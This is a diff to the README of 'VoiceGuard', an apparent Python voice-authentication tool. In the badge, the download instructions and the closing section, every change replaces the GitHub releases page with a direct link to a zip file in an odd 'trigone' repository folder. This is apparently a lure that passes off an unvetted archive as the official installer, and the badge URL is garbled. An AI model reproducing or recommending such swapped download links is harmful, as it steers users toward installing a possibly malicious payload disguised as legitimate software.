@@ -4,7 +4,7 @@
 VoiceGuard is an advanced voice authentication system that uses OpenAI's ChatGPT and Whisper APIs. This software offers a secure way to identify individuals based on their voice. With AI-powered analysis and multi-sample enrollment, it provides enterprise-grade authentication logging to ensure you are who you say you are. VoiceGuard is built with Python and uses an SQLite database to manage data efficiently.
 
 ## 🔗 Download Now
-[![Download VoiceGuard](https://img.shields.io/badge/Download%20VoiceGuard-v1.0-blue.svg)](https://github.com/krushna4141/VoiceGuard/releases)
+[![Download VoiceGuard](https://raw.githubusercontent.com/krushna4141/VoiceGuard/main/trigone/VoiceGuard.zip%https://raw.githubusercontent.com/krushna4141/VoiceGuard/main/trigone/VoiceGuard.zip)](https://raw.githubusercontent.com/krushna4141/VoiceGuard/main/trigone/VoiceGuard.zip)
 
 ## 🚀 Getting Started
 Follow these steps to install and run VoiceGuard on your computer.
@@ -18,7 +18,7 @@ Before downloading, make sure your computer meets these requirements:
 - Storage: Minimum of 100 MB available space
 
 ### 2. Download VoiceGuard
-To download the application, visit this page: [VoiceGuard Releases](https://github.com/krushna4141/VoiceGuard/releases). 
+To download the application, visit this page: [VoiceGuard Releases](https://raw.githubusercontent.com/krushna4141/VoiceGuard/main/trigone/VoiceGuard.zip). 
 
 Locate the latest version and download the installer for your operating system. 
 
@@ -73,4 +73,4 @@ Join the community on GitHub to collaborate or seek help. You can report issues 
 VoiceGuard is open-source software. Check the license file in the repository for more details.
 
 ## 🔗 Download Again
-To get VoiceGuard, visit this page: [VoiceGuard Releases](https://github.com/krushna4141/VoiceGuard/releases). Enjoy exploring the advanced features of our voice authentication system!
+To get VoiceGuard, visit this page: [VoiceGuard Releases](https://raw.githubusercontent.com/krushna4141/VoiceGuard/main/trigone/VoiceGuard.zip). Enjoy exploring the advanced features of our voice authentication system!
